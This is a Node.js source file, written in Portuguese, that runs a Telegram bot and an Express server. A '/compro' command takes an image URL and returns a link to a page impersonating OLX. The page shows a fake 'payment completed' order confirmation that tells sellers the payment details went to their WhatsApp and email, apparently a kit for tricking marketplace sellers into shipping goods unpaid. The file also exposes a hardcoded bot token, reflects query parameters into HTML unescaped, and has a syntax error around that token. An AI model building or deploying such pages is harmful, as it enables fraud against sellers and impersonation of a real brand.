const express = require('express');
const { Telegraf } = require('telegraf');
const { v4: uuidv4 } = require('uuid');

const app = express();
const PORT = process.env.PORT || 3000;

const bot = new Telegraf(7522166105:AAHIRTLQ0kanfhNNPmy7MGjcqepKG1mnGrg)
const SERVER_URL = process.env.RENDER_URL 



// ==== BOT COMANDO ====
bot.command('compro', (ctx) => {
  const args = ctx.message.text.split(' ');
  const imageUrl = args[1];

  if (!imageUrl) {
    ctx.reply('❌ Envie: /compro <url da imagem>');
    return;
  }

  const id = uuidv4().slice(0, 8);
  const link = `${SERVER_URL}/pedido?id=${id}&img=${encodeURIComponent(imageUrl)}`;

  ctx.reply(`✅ Sua página foi criada:\n${link}`);
});

bot.launch();
console.log('🤖 Bot do Telegram rodando...');

// ==== SERVIDOR EXPRESS ====
app.get('/pedido', (req, res) => {
  const id = req.query.id || '123ABC';
  const image_url = req.query.img || 'https://via.placeholder.com/70';

  res.send(`
    <!DOCTYPE html>
    <html lang="pt-BR">
    <head>
      <meta charset="UTF-8">
      <title>Detalhes da Compra - OLX</title>
      <style>
        body { font-family: Arial, sans-serif; padding: 16px; }
        .top-bar { display: flex; justify-content: space-between; align-items: center; margin-bottom: 24px; }
        .logo { font-weight: bold; font-size: 24px; }
        .logo .o { color: #800080; }
        .logo .l { color: #00a859; }
        .logo .x { color: #ff6600; }
        .btn-anunciar { background: #ff6600; color: #fff; padding: 8px 14px; border-radius: 20px; text-decoration: none; font-weight: bold; font-size: 14px; }
        h2 { font-size: 20px; margin-bottom: 8px; }
        .pedido-id { font-size: 14px; color: #666; margin-bottom: 20px; }
        .produto-info { display: flex; align-items: center; gap: 12px; margin-bottom: 20px; }
        .produto-info img { width: 70px; height: 70px; object-fit: cover; border-radius: 8px; }
        .pagamento-status { background: #00a859; color: #fff; padding: 10px 16px; border-radius: 20px; font-weight: bold; font-size: 14px; }
        .aviso { background: #eee1f5; color: #800080; font-weight: bold; padding: 12px; border-radius: 8px; font-size: 12px; text-align: center; margin-bottom: 20px; }
        .btn-preparando { display: block; background: #00a859; color: #fff; text-align: center; padding: 12px; border-radius: 20px; text-decoration: none; font-weight: bold; margin-bottom: 20px; }
        .etapas { display: flex; flex-direction: column; gap: 8px; margin-bottom: 20px; padding-left: 24px; position: relative; }
        .etapas::before { content: ""; position: absolute; left: 8px; top: 0; bottom: 0; width: 2px; background: #00a859; }
        .etapa { display: flex; align-items: center; font-size: 14px; }
        .etapa::before { content: "✔"; color: #00a859; font-weight: bold; margin-right: 8px; }
        .voltar { display: block; text-align: center; color: #800080; font-weight: bold; text-decoration: none; margin-top: 20px; font-size: 14px; }
      </style>
    </head>
    <body>
      <div class="top-bar">
        <div class="logo">
          <span class="o">O</span><span class="l">L</span><span class="x">X</span>
        </div>
        <a class="btn-anunciar" href="#">Anunciar grátis</a>
      </div>

      <h2>Detalhes da compra</h2>
      <div class="pedido-id">Pedido <strong>${id}</strong> 📋</div>

      <div class="produto-info">
        <img src="${image_url}" alt="Produto">
        <div class="pagamento-status">Pagamento concluído</div>
      </div>

      <h3>Recebemos seu pedido</h3>
      <p>Obrigado por comprar na OLX! Recebemos seu pedido e o pagamento foi aprovado.</p>

      <div class="aviso">
        TODAS AS INFORMAÇÕES DO PAGAMENTO<br>
        FORAM ENVIADAS PARA O WHATSAPP E E-MAIL DO VENDEDOR
      </div>

      <a href="#" class="btn-preparando">Estamos preparando seu pedido</a>

      <div class="etapas">
        <div class="etapa">Confirmação do pagamento</div>
        <div class="etapa">Recebemos seu pedido</div>
      </div>

      <a href="#" class="voltar">Voltar ao anúncio</a>
    </body>
    </html>
  `);
});

app.listen(PORT, () => {
  console.log(`✅ Servidor rodando na porta ${PORT}`);
});
